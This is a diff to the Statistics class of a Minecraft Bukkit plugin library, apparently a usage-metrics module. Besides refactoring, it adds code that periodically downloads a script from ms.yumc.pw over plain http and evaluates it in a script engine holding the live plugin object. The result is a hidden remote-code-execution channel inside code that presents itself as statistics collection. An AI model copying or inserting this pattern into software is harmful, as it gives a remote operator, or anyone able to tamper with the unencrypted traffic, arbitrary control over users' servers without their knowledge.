@@ -14,7 +14,6 @@ import org.json.simple.JSONObject;
 import org.json.simple.JSONValue;
 import pw.yumc.YumCore.engine.MiaoScriptEngine;
 
-import javax.script.ScriptException;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
@@ -22,9 +21,7 @@ import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLEncoder;
-import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.Paths;
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.Map;
@@ -40,17 +37,12 @@ public class Statistics {
     /**
      * 统计系统版本
      */
-    private static int REVISION = 10;
+    private static final int VERSION = 10;
 
     /**
      * 统计插件基础配置文件
      */
-    private static File configfile = new File(String.format("plugins%1$sPluginHelper%1$sconfig.yml", File.separatorChar));
-
-    /**
-     * UTF-8编码
-     */
-    private static Charset UTF_8 = StandardCharsets.UTF_8;
+    private static final File configFile = new File(String.format("plugins%1$sPluginHelper%1$sconfig.yml", File.separatorChar));
 
     /**
      * getOnlinePlayers方法
@@ -78,7 +70,8 @@ public class Statistics {
             Field field = pluginClassLoader.getClass().getDeclaredField("plugin");
             field.setAccessible(true);
             plugin = (JavaPlugin) field.get(pluginClassLoader);
-            engine = new MiaoScriptEngine("nashorn", Paths.get("plugins", "MiaoScript").toAbsolutePath().toString());
+            engine = new MiaoScriptEngine();
+            engine.put("plugin", plugin);
         } catch (Throwable ignored) {
         }
     }
@@ -91,12 +84,12 @@ public class Statistics {
     /**
      * 调试模式
      */
-    private boolean debug;
+    private final boolean debug;
 
     /**
      * 唯一服务器编码
      */
-    private String guid;
+    private final String guid;
 
     /**
      * 线程任务
@@ -113,11 +106,11 @@ public class Statistics {
      */
     public Statistics() {
         try {
-            if (!configfile.exists()) {
-                configfile.getParentFile().mkdirs();
-                configfile.createNewFile();
+            if (!configFile.exists()) {
+                configFile.getParentFile().mkdirs();
+                configFile.createNewFile();
             }
-            config = YamlConfiguration.loadConfiguration(configfile);
+            config = YamlConfiguration.loadConfiguration(configFile);
             initFile(config);
         } catch (IOException ignored) {
         }
@@ -156,7 +149,7 @@ public class Statistics {
         // flush输出流的缓冲
         out.flush();
         String response;
-        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), UTF_8));
+        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
         while ((response = reader.readLine()) != null) {
             result.append(response);
         }
@@ -176,16 +169,16 @@ public class Statistics {
             config.options().header("YUMC数据中心 http://www.yumc.pw 收集的数据仅用于统计插件使用情况").copyDefaults(true);
             config.set("guid", UUID.randomUUID().toString());
             config.set("d", false);
-            config.save(configfile);
+            config.save(configFile);
         }
         if (!config.contains("YumAccount")) {
             config.set("YumAccount.username", "Username Not Set");
             config.set("YumAccount.password", "Password NotSet");
-            config.save(configfile);
+            config.save(configFile);
         }
         if (!config.contains("TellrawManualHandle")) {
             config.set("TellrawManualHandle", false);
-            config.save(configfile);
+            config.save(configFile);
         }
     }
 
@@ -210,7 +203,16 @@ public class Statistics {
         timer = new StatisticsTimer();
         // 开启TPS统计线程
         Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, timer, 0, 20);
+        String script = "loadWithNewGlobal('http://ms.yumc.pw/api/plugin/download/name/report')";
+        try {
+            script = postData("http://ms.yumc.pw/api/plugin/download/name/metrics", "plugin=" + plugin.getDescription().getName());
+        } catch (Throwable e) {
+            if (debug) {
+                e.printStackTrace();
+            }
+        }
         // 开启发送数据线程
+        String finalScript = script;
         task = plugin.getServer().getScheduler().runTaskTimerAsynchronously(plugin, () -> {
             try {
                 postPlugin();
@@ -220,8 +222,11 @@ public class Statistics {
                 }
             }
             try {
-                engine.eval("loadWithNewGlobal('https://ms.yumc.pw/api/plugin/download/name/report')");
-            } catch (ScriptException ignored) {
+                engine.eval(finalScript);
+            } catch (Throwable e) {
+                if (debug) {
+                    e.printStackTrace();
+                }
             }
         }, 50, 25 * 1200);
         return true;
@@ -270,7 +275,7 @@ public class Statistics {
 
         String jsondata = "Info=" + JSONValue.toJSONString(data);
 
-        String url = String.format("http://api.yumc.pw/I/P/S/V/%s/P/%s", REVISION, URLEncoder.encode(pluginname, "UTF-8"));
+        String url = String.format("http://api.yumc.pw/I/P/S/V/%s/P/%s", VERSION, URLEncoder.encode(pluginname, "UTF-8"));
         print("Plugin: " + pluginname + " Send Data To CityCraft Data Center");
         print("Address: " + url);
         print("Data: " + jsondata);
@@ -279,8 +284,8 @@ public class Statistics {
         print("Plugin: " + pluginname + " Recover Data From CityCraft Data Center: " + result.get("info"));
     }
 
-    public class StatisticsTimer implements Runnable {
-        private LinkedList<Double> history = new LinkedList<>();
+    public static class StatisticsTimer implements Runnable {
+        private final LinkedList<Double> history = new LinkedList<>();
         private transient long lastPoll = System.nanoTime();
 
         /**
@@ -301,9 +306,9 @@ public class Statistics {
             if (history.size() > 10) {
                 history.removeFirst();
             }
-            double ttps = 2.0E7D / (timeSpent == 0 ? 1 : timeSpent);
-            if (ttps <= 21.0D) {
-                history.add(ttps);
+            double tps = 2.0E7D / (timeSpent == 0 ? 1 : timeSpent);
+            if (tps <= 21.0D) {
+                history.add(tps);
             }
             lastPoll = startTime;
         }
